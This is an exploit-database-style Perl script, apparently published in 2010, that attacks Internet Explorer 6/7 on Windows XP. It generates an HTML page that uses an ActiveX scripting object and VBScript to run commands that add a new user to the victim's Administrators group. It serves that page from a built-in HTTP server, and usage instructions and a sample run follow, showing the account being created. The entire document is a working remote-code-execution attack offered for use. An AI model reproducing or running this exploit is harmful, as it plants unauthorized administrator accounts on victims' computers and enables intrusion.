# Exploit Title: Internet Explorer ( 6/7) Remote Code Execution -Remote User Add Exploit
# Date: 15/02/2010
# Author: Sioma Labs
# Software Link: N/A
# Version: IE 7
# Tested on: Windows XP sp2
# CVE :
# Code :
 
#!/usr/bin/perl
 
use strict;
use Socket;
use IO::Socket;
print "\n";
print "800008                           8                      \n";
print "8      e  eeeee eeeeeee eeeee    8     eeeee eeeee  eeeee\n";
print "8eeeee 8  8  88 8  8  8 8   8    8e    8   8 8   8  8   | \n";
print "    88 8e 8   8 8e 8  8 8eee8    88    8eee8 8eee8e 8eeee \n";
print "e   88 88 8   8 88 8  8 88  8    88    88  8 88   8    88 \n";
print "8eee88 88 8eee8 88 8  8 88  8    88eee 88  8 88eee8 8ee88 \n";
print "-----------------------------------------------------------\n";
print " Useage : $0 Port \n";
print " Please Read the Instruction befor you use this \n";
print " ---------------------------------\n";
 
sub parse_form {
    my $data = $_[0];
    my %data;
    foreach (split /&/, $data) {
        my ($key, $val) = split /=/;
        $val =~ s/\+/ /g;
        $val =~ s/%(..)/chr(hex($1))/eg;
        $data{$key} = $val;}
    return %data; }
 
my $port = shift;
defined($port) or die "Usage: $0 Port \n";
mkdir("public_html", 0777) || print $!;
my $DOCUMENT_ROOT = $ENV{'HOME'} . "/public_html";
 
print " [+] Account Name : "; chomp(my $acc=<STDIN>);
print " [+] Account Password : "; chomp(my $pass=<STDIN>);
print " [+] Your IP : "; chomp (my $ip=<STDIN>);
#------------- Exploit -----------------
my $iexplt= "public_html/index.html";
 open (myfile, ">>$iexplt");
    print myfile "<html>\n";
    print myfile "<title> IE User Add Test </title>\n";
    print myfile "<head>";
    print myfile "</font></b></p>\n";
    print myfile "<p>\n";
    print myfile "<object classid='clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8' id='exploit'\n";
    print myfile  "></object>\n";
    print myfile  "<script language='vbscript'>\n";
    print myfile  "adduser=";
    print myfile '"cmd';
    print myfile " /c net user $acc $pass /add && net localgroup Administrators $acc ";
    print myfile '/add"';
    print myfile "\n";
    print myfile "exploit.run adduser \n";
    print myfile "\n </script></p>\n";
    print " [+] ----------------------------------------\n";
    print " [-] Link Genetrated : http://$ip:$port/index.html\n";
        close (myfile);
#------------------------------------
 
my $server = new IO::Socket::INET(Proto => 'tcp',
                                  LocalPort => $port,
                                  Listen => SOMAXCONN,
                                  Reuse => 1);
$server or die "Unable to create server socket: $!" ;
 
while (my $client = $server->accept()) {
    $client->autoflush(1);
    my %request = ();
    my %data;
 
    {
 
        local $/ = Socket::CRLF;
        while (<$client>) {
            chomp;
            if (/\s*(\w+)\s*([^\s]+)\s*HTTP\/(\d.\d)/) {
                $request{METHOD} = uc $1;
                $request{URL} = $2;
                $request{HTTP_VERSION} = $3;
            }
            elsif (/:/) {
                (my $type, my $val) = split /:/, $_, 2;
                $type =~ s/^\s+//;
                foreach ($type, $val) {
                         s/^\s+//;
                         s/\s+$//;
                }
                $request{lc $type} = $val;
            }
            elsif (/^$/) {
                read($client, $request{CONTENT}, $request{'content-length'})
                    if defined $request{'content-length'};
                last;
            }
        }
    }
 
 
    if ($request{METHOD} eq 'GET') {
        if ($request{URL} =~ /(.*)\?(.*)/) {
                $request{URL} = $1;
                $request{CONTENT} = $2;
                %data = parse_form($request{CONTENT});
        } else {
                %data = ();
        }
        $data{"_method"} = "GET";
    } elsif ($request{METHOD} eq 'POST') {
                %data = parse_form($request{CONTENT});
                $data{"_method"} = "POST";
    } else {
        $data{"_method"} = "ERROR";
    }
 
 
        my $localfile = $DOCUMENT_ROOT.$request{URL};
 
 
        if (open(FILE, "<$localfile")) {
            print $client "HTTP/1.0 200 OK", Socket::CRLF;
            print $client "Content-type: text/html", Socket::CRLF;
            print $client Socket::CRLF;
            my $buffer;
            while (read(FILE, $buffer, 4096)) {
                print $client $buffer;
            }
            $data{"_status"} = "200";
        }
        else {
            print $client "HTTP/1.0 404 Not Found", Socket::CRLF;
            print $client Socket::CRLF;
            print $client "<html><body>404 Not Found</body></html>";
            $data{"_status"} = "404";
        }
        close(FILE);
 
 
        print ($DOCUMENT_ROOT.$request{URL},"\n");
        foreach (keys(%data)) {
                print ("   $_ = $data{$_}\n"); }
 
 
    close $client;
    # Sioma Labs
    # http://siomalabs.com
    # Sioma Agent 154
}
#Instructions
#-----------
#
# This has been tested on windows envirnment(VisTa) . and the victom OS was windows xp sp2 ( InterNET eXplorer 7 )
# To use this on remote PC the generated link should be on victims trusted site list (tools >Internet Option> Security > Trusted Site> Sites)
# No requrement to run it locally . just open the exploit(public_html/index.html) with the IE
# Test Run ( Used OS : Vista) / ( Victim Os : XP SP2 )
# -------------------------------------------------------------
#
# Attacker
# =============
#
#
# E:\>ie.pl 123
#
#800008                           8
#8      e  eeeee eeeeeee eeeee    8     eeeee eeeee  eeeee
#8eeeee 8  8  88 8  8  8 8   8    8e    8   8 8   8  8   |
#    88 8e 8   8 8e 8  8 8eee8    88    8eee8 8eee8e 8eeee
#e   88 88 8   8 88 8  8 88  8    88    88  8 88   8    88
#8eee88 88 8eee8 88 8  8 88  8    88eee 88  8 88eee8 8ee88
#-----------------------------------------------------------
# Useage : E:\ie.pl Port
# Please Read the Instruction befor you use this \n";
# ---------------------------------
#[+] Account Name : test
# [+] Account Password : test
# [+] Your IP : 192.168.1.102
# [+] ----------------------------------------
# [-] Link Genetrated : http://192.168.1.102:123/index.html
#
#------------------------------------------------------------>
# Not Tested on Linux ( Should Work on it too) #
#
# Victim
#========
# Befor -
# C:\>net user
#
#User accounts for \\PC-00583E3C730C
#
#-------------------------------------------------------------------------------
#Administrator            SiomaPC                Guest
#HelpAssistant            SUPPORT_388945a0
#The command completed successfully.
#
# After -
#C:\>net user
#
#User accounts for \\PC-00583E3C730C
#
#-------------------------------------------------------------------------------
#Administrator            SiomaPC                Guest
#HelpAssistant            SUPPORT_388945a0        test
#The command completed successfully.
#
#C:\>
# ============================================================================
# The "test" user has been created successfully
#
# Delete The "Public_Html\index.html" If you use this for the 2nd time 